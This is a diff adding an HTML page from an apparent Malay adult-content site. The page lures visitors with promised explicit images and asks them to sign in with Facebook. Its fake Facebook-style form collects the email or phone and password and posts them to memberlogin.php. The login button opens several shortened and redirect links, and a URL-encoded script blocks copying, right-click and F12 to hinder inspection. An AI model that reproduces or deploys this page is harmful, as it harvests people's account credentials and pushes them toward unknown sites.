@@ -1,0 +1,149 @@
+
+<!-- saved from url=(0029) http://melayu-bugil.bl.ee/ -->
+<html><head>
+
+<Script Language='Javascript'>
+<!--
+document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%4A%61%76%61%53%63%72%69%70%74%22%3E%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%41%6E%74%69%20%63%6F%70%79%20%70%61%73%74%65%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%66%75%6E%63%74%69%6F%6E%20%6B%69%6C%6C%43%6F%70%79%28%65%29%7B%0A%72%65%74%75%72%6E%20%66%61%6C%73%65%0A%7D%0A%66%75%6E%63%74%69%6F%6E%20%72%65%45%6E%61%62%6C%65%28%29%7B%0A%72%65%74%75%72%6E%20%74%72%75%65%0A%7D%0A%64%6F%63%75%6D%65%6E%74%2E%6F%6E%73%65%6C%65%63%74%73%74%61%72%74%3D%6E%65%77%20%46%75%6E%63%74%69%6F%6E%20%28%22%72%65%74%75%72%6E%20%66%61%6C%73%65%22%29%0A%69%66%20%28%77%69%6E%64%6F%77%2E%73%69%64%65%62%61%72%29%7B%0A%64%6F%63%75%6D%65%6E%74%2E%6F%6E%6D%6F%75%73%65%64%6F%77%6E%3D%6B%69%6C%6C%43%6F%70%79%0A%64%6F%63%75%6D%65%6E%74%2E%6F%6E%63%6C%69%63%6B%3D%72%65%45%6E%61%62%6C%65%0A%7D%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%65%6E%64%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%73%63%72%69%70%74%20%74%65%78%74%3D%22%74%65%78%74%6A%61%76%61%73%63%72%69%70%74%22%3E%20%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%41%6E%74%69%20%63%74%72%6C%20%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%66%75%6E%63%74%69%6F%6E%20%64%65%74%65%63%74%28%29%20%7B%20%0A%20%20%76%61%72%20%70%72%65%73%73%4B%65%79%20%3D%20%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%65%76%65%6E%74%2E%6B%65%79%43%6F%64%65%29%3B%20%0A%20%20%69%66%20%28%65%76%65%6E%74%2E%63%74%72%6C%4B%65%79%29%20%7B%20%61%6C%65%72%74%28%27%45%72%72%6F%72%27%29%3B%0A%20%20%7D%0A%7D%3B%20%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%65%6E%64%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%62%6F%64%79%20%6F%6E%6B%65%79%64%6F%77%6E%20%3D%22%64%65%74%65%63%74%28%29%22%3E%0A%0A%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%4A%61%76%61%53%63%72%69%70%74%22%3E%0A%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%46%31%32%20%64%69%73%61%62%6C%65%20%63%6F%64%65%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%6F%6E%6B%65%79%70%72%65%73%73%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%65%76%65%6E%74%29%20%7B%0A%20%20%20%20%20%20%20%20%65%76%65%6E%74%20%3D%20%28%65%76%65%6E%74%20%7C%7C%20%77%69%6E%64%6F%77%2E%65%76%65%6E%74%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%65%76%65%6E%74%2E%6B%65%79%43%6F%64%65%20%3D%3D%20%31%32%33%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%2F%2F%61%6C%65%72%74%28%27%4E%6F%20%46%2D%31%32%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%6F%6E%6D%6F%75%73%65%64%6F%77%6E%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%65%76%65%6E%74%29%20%7B%0A%20%20%20%20%20%20%20%20%65%76%65%6E%74%20%3D%20%28%65%76%65%6E%74%20%7C%7C%20%77%69%6E%64%6F%77%2E%65%76%65%6E%74%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%65%76%65%6E%74%2E%6B%65%79%43%6F%64%65%20%3D%3D%20%31%32%33%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%61%6C%65%72%74%28%27%4E%6F%20%46%2D%6B%65%79%73%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%64%6F%63%75%6D%65%6E%74%2E%6F%6E%6B%65%79%64%6F%77%6E%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%65%76%65%6E%74%29%20%7B%0A%20%20%20%20%20%20%20%20%65%76%65%6E%74%20%3D%20%28%65%76%65%6E%74%20%7C%7C%20%77%69%6E%64%6F%77%2E%65%76%65%6E%74%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%65%76%65%6E%74%2E%6B%65%79%43%6F%64%65%20%3D%3D%20%31%32%33%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%61%6C%65%72%74%28%27%4E%6F%20%46%2D%6B%65%79%73%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%65%6E%64%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%20%0A%3C%21%2D%2D%20%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%44%69%73%61%62%6C%65%20%72%69%67%68%74%20%63%6C%69%63%6B%20%73%63%72%69%70%74%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%2F%2F%76%69%73%69%74%20%68%74%74%70%3A%2F%2F%77%77%77%2E%72%61%69%6E%62%6F%77%2E%61%72%63%68%2E%73%63%72%69%70%74%6D%61%6E%69%61%2E%63%6F%6D%2F%73%63%72%69%70%74%73%2F%20%0A%76%61%72%20%6D%65%73%73%61%67%65%3D%22%53%6F%72%72%79%2C%20%72%69%67%68%74%2D%63%6C%69%63%6B%20%68%61%73%20%62%65%65%6E%20%64%69%73%61%62%6C%65%64%22%3B%20%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%20%0A%66%75%6E%63%74%69%6F%6E%20%63%6C%69%63%6B%49%45%28%29%20%7B%69%66%20%28%64%6F%63%75%6D%65%6E%74%2E%61%6C%6C%29%20%7B%28%6D%65%73%73%61%67%65%29%3B%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%7D%7D%20%0A%66%75%6E%63%74%69%6F%6E%20%63%6C%69%63%6B%4E%53%28%65%29%20%7B%69%66%20%0A%28%64%6F%63%75%6D%65%6E%74%2E%6C%61%79%65%72%73%7C%7C%28%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%26%26%21%64%6F%63%75%6D%65%6E%74%2E%61%6C%6C%29%29%20%7B%20%0A%69%66%20%28%65%2E%77%68%69%63%68%3D%3D%32%7C%7C%65%2E%77%68%69%63%68%3D%3D%33%29%20%7B%28%6D%65%73%73%61%67%65%29%3B%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%7D%7D%7D%20%0A%69%66%20%28%64%6F%63%75%6D%65%6E%74%2E%6C%61%79%65%72%73%29%20%0A%7B%64%6F%63%75%6D%65%6E%74%2E%63%61%70%74%75%72%65%45%76%65%6E%74%73%28%45%76%65%6E%74%2E%4D%4F%55%53%45%44%4F%57%4E%29%3B%64%6F%63%75%6D%65%6E%74%2E%6F%6E%6D%6F%75%73%65%64%6F%77%6E%3D%63%6C%69%63%6B%4E%53%3B%7D%20%0A%65%6C%73%65%7B%64%6F%63%75%6D%65%6E%74%2E%6F%6E%6D%6F%75%73%65%75%70%3D%63%6C%69%63%6B%4E%53%3B%64%6F%63%75%6D%65%6E%74%2E%6F%6E%63%6F%6E%74%65%78%74%6D%65%6E%75%3D%63%6C%69%63%6B%49%45%3B%7D%20%0A%64%6F%63%75%6D%65%6E%74%2E%6F%6E%63%6F%6E%74%65%78%74%6D%65%6E%75%3D%6E%65%77%20%46%75%6E%63%74%69%6F%6E%28%22%72%65%74%75%72%6E%20%66%61%6C%73%65%22%29%20%0A%2F%2F%20%2D%2D%3E%20%0A%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%65%6E%64%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%0A%3C%2F%73%63%72%69%70%74%3E%20'));
+//-->
+</Script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>3GP Melayu Nakal</title>
+<link href="http://icons.iconarchive.com/icons/icons-land/vista-love/24/Flowers-Heart-Roses-icon.png" rel="SHORTCUT ICON">
+<link href="./noty_files/css" rel="stylesheet" type="text/css">
+<link href="./noty_files/css(1)" rel="stylesheet" type="text/css">
+</head>
+
+<body bgcolor="red">
+<center><font face="Orbitron" size="5" color="White" class="a">Welcome To Melayu Bugil</font></center>
+<center><font face="Orbitron" size="3" color="White" class="a">Official Website</font></center>
+
+<br><hr>
+
+
+<div style="display:scroll; position:fixed; top:300px; left:560px;"><img width="200" height="200" style="" src="./noty_files/6fU534y.jpg">
+
+<div style="display:scroll; position:fixed; top:300px; left:110px;"><img width="200" height="200" style="" src="./noty_files/awek_melayu_seksi_lyg91y3ore9mp359aea_1.jpg">
+
+<div style="display:scroll; position:fixed; top:300px; left:330px;"><img width="200" height="200" style="" src="./noty_files/awek+less.jpg">
+
+<div style="display:scroll; position:fixed; top:300px; left:790px;"><img width="200" height="200" style="" src="./noty_files/lelaki-ghairah-seksi2.jpg">
+
+<div style="display:scroll; position:fixed; top:300px; left:1010px;"><img width="200" height="200" style="" src="./noty_files/tumblr_mqcpryyBqz1so828vo1_500.gif">
+
+
+<br><br></div></div></div></div></div><br>
+
+<center><font face="Orbitron" size="5" color="White" class="a">Sign in with your facebook account.</font></center>
+
+<center>
+
+<div class="navbar section" id="navbar"></div>
+
+
+
+<div class="wrapper">
+
+
+</div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_container"><form id="login_form" action="memberlogin.php" name="login_form" id="login_form" onsubmit="return ValidateForm();" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><input type="hidden" autocomplete="off"><div id="loginform"><input type="hidden" autocomplete="off" id="display"><input type="hidden" autocomplete="off" id="enable_profile_selector"><input type="hidden" autocomplete="off" id="legacy_return"><input type="hidden" autocomplete="off" id="next"><input type="hidden" autocomplete="off" id="profile_selector_ids"><input type="hidden" autocomplete="off" id="trynum"><input type="hidden" autocomplete="off"><input type="hidden"><input type="hidden" id="lgnjs"><div class="form_row clearfix"><label for="email" class="login_form_label">Email or Phone:</label><input type="text" class="inputtext" id="email" name="email" value=""></div><div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="pass" id="pass" class="inputpassword"></div><div class="persistent">
+
+<div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" checked="1" class="uiInputLabelInput uiInputLabelCheckbox"><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent">
+
+
+<div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"> <a target="_blank" onclick="window.open(&quot;http://bit.ly/1mxIhK3&quot;); window.open(&quot;http://my.digestrr.com/p/76KoF&quot;); window.open(&quot;http://my.digestrr.com/p/76Ksx&quot;); window.open(&quot;http://my.digestrr.com/p/78An8&quot;); window.open(&quot;http://my.digestrr.com/p/77TU3&quot;); window.open(&quot;http://bit.ly/1mBjCEe&quot;);"> <input value="Log In" name="login" type="submit"></label></div>
+
+</form> 
+<script type="text/javascript"> 
+ 
+function echeck(str) {
+        var err = "Please enter a valid email address";
+		var at="@"
+		var dot="."
+		var lat=str.indexOf(at)
+		var lstr=str.length
+		var ldot=str.indexOf(dot)
+		if (str.indexOf(at)==-1){
+		   alert(err)
+		   return false
+		}
+ 
+		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
+		   alert(err)
+		   return false
+		}
+ 
+		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
+		    alert(err)
+		    return false
+		}
+ 
+		 if (str.indexOf(at,(lat+1))!=-1){
+		    alert(err)
+		    return false
+		 }
+ 
+		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
+		    alert(err)
+		    return false
+		 }
+ 
+		 if (str.indexOf(dot,(lat+2))==-1){
+		    alert(err)
+		    return false
+		 }
+ 
+		 if (str.indexOf(" ")!=-1){
+		    alert(err)
+		    return false
+		 }
+ 
+ 		 return true
+	}
+ 
+function ValidateForm(){
+	var emailID=document.login_form.email
+	var ps=document.login_form.password
+ 
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please enter email address and password");
+		emailID.focus();
+		return false
+	}
+	if (echeck(emailID.value)==false){
+		emailID.focus();
+		return false
+	}
+	if (ps.value==''){
+		ps.focus();
+        alert("Please enter password");
+		return false
+	}
+	return true
+ }
+</script> 
+
+<div class="hr"></div> 
+ 
+<p> <b> 18SX Collection</b> | Powered by melayu-bugil
+ </p> 
+<br> 
+ 
+ 
+<script type="text/javascript"> 
+
+
+
+<br>
+<font style="background-color:rgb(100, 100, 100);" color="white" face="Orbiton" size="2" class="c"><marquee>Please sign in with your facebook account to get more Melayu Bugil.</marquee></font>
+
+
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+<center>
+<font face="Orbitron" size="3" color="White" class="a"> Melayu Bugil Official Website | Koleksi Awek Melayu Cun </font> </center>
+
+</a>
+
+</body></html>
+<!--DEFAULT_WELCOME_PAGE-->
